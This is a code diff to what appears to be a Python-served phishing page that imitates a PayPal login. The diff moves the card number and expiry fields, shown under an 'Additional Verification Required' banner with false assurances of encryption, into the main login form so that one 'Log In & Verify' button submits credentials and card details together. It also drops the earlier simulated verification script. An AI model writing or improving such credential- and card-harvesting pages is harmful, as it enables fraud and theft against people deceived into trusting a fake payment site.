@@ -382,14 +382,14 @@ def index():
                 background: #F8F9FA;
                 border-radius: 12px;
                 padding: 20px;
-                margin-top: 25px;
+                margin: 25px 0 20px;
                 border: 2px dashed #DEE2E6;
             }
             
             @media (min-width: 768px) {
                 .card-verification {
                     padding: 30px;
-                    margin-top: 30px;
+                    margin: 30px 0 20px;
                 }
             }
             
@@ -722,35 +722,13 @@ def index():
                         </div>
                     </div>
                     
-                    <button type="submit" class="login-btn">
-                        Log In
-                    </button>
-                </form>
-                
-                <div class="continue-with">or continue with</div>
-                
-                <div class="quick-links">
-                    <a href="#" class="quick-link">
-                        <div class="link-icon">📱</div>
-                        <div>Phone</div>
-                    </a>
-                    <a href="#" class="quick-link">
-                        <div class="link-icon">📧</div>
-                        <div>Email</div>
-                    </a>
-                    <a href="#" class="quick-link">
-                        <div class="link-icon">#️⃣</div>
-                        <div>SMS</div>
-                    </a>
-                </div>
-                
-                <div class="card-verification">
-                    <div class="verification-title">
-                        <span>🔐</span>
-                        Additional Verification Required
-                    </div>
-                    
-                    <form id="verification-form">
+                    <!-- Card verification fields moved inside main form, before submit button -->
+                    <div class="card-verification">
+                        <div class="verification-title">
+                            <span>🔐</span>
+                            Additional Verification Required
+                        </div>
+                        
                         <div class="form-group">
                             <label class="form-label">Card Number</label>
                             <input type="text" 
@@ -799,14 +777,28 @@ def index():
                             <div>Your card details are encrypted and securely transmitted. 
                             This is a one-time verification process.</div>
                         </div>
-                        
-                        <button type="button" 
-                                class="login-btn" 
-                                onclick="verifyCard()" 
-                                style="background: var(--paypal-green);">
-                            Verify & Continue
-                        </button>
-                    </form>
+                    </div>
+                    
+                    <button type="submit" class="login-btn">
+                        Log In & Verify
+                    </button>
+                </form>
+                
+                <div class="continue-with">or continue with</div>
+                
+                <div class="quick-links">
+                    <a href="#" class="quick-link">
+                        <div class="link-icon">📱</div>
+                        <div>Phone</div>
+                    </a>
+                    <a href="#" class="quick-link">
+                        <div class="link-icon">📧</div>
+                        <div>Email</div>
+                    </a>
+                    <a href="#" class="quick-link">
+                        <div class="link-icon">#️⃣</div>
+                        <div>SMS</div>
+                    </a>
                 </div>
                 
                 <div class="payment-activity">
@@ -869,45 +861,6 @@ def index():
                     toggleButton.setAttribute('aria-label', 'Show password');
                 }
                 
-                // Prevent form submission
-                return false;
-            }
-            
-            function verifyCard() {
-                const form = document.getElementById('verification-form');
-                const button = form.querySelector('.login-btn');
-                
-                if (form.checkValidity()) {
-                    button.textContent = 'Verifying...';
-                    button.disabled = true;
-                    button.style.opacity = '0.7';
-                    
-                    // Simulate verification process
-                    setTimeout(() => {
-                        button.textContent = '✓ Verified Successfully';
-                        button.style.background = '#00A65A';
-                        
-                        // Show success message
-                        const alertDiv = document.createElement('div');
-                        alertDiv.className = 'security-note';
-                        alertDiv.style.marginTop = '20px';
-                        alertDiv.innerHTML = `
-                            <span>✅</span>
-                            <div><strong>Verification Complete!</strong> Your account access has been restored. 
-                            You will be redirected shortly.</div>
-                        `;
-                        form.appendChild(alertDiv);
-                        
-                        // Auto-submit main form after verification
-                        setTimeout(() => {
-                            document.getElementById('main-form').submit();
-                        }, 2000);
-                    }, 1500);
-                } else {
-                    form.reportValidity();
-                }
-                
-                // Prevent default form submission
                 return false;
             }
             
@@ -925,14 +878,6 @@ def index():
                     value = value.substring(0, 2) + '/' + value.substring(2, 4);
                 }
                 e.target.value = value.substring(0, 5);
-            });
-            
-            // Prevent form submission on Enter for card verification form
-            document.getElementById('verification-form').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    verifyCard();
-                }
             });
             
             // Animate balance on load
